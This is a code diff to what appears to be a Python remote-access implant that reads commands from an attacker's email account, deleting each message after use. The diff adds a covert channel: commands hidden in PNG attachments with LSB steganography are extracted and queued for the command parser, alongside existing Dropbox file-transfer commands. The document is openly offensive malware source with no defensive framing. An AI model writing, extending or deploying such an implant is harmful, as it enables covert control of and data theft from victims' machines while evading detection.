@@ -7,6 +7,7 @@ import socket
 import ssl
 import dropbox
 import uuid
+from stegano import lsb
 
 #Commands List
 #To send a file to user: download [Dropbox path] [Local name] [id]
@@ -200,10 +201,24 @@ def readEmail():
         if(sender == attacker_email):
             if(str(id) in subject):
                 mail.store(i, '+FLAGS', '\\Deleted')
-                commands.append(subject)
+                if("Update" in subject):
+                    if (len(msg.get_payload()) == 2):
+                        attachment = msg.get_payload()[1]
+                    if(attachment.get_content_type() == 'image/png'):
+                        try: 
+                            open('attachment.png', 'wb').write(attachment.get_payload(decode=True))
+                            cmd = lsb.reveal("attachment.png")
+                            #print(cmd)
+                            commands.append(cmd)
+                            os.remove('attachment.png')
+                        except:
+                            print("Error importing image")
+                else:
+                    commands.append(subject)
             elif("all" in subject):
                 commands.append(subject)
                 isBroadcast = True
+                
 
     if commands:
        commandParser(commands)
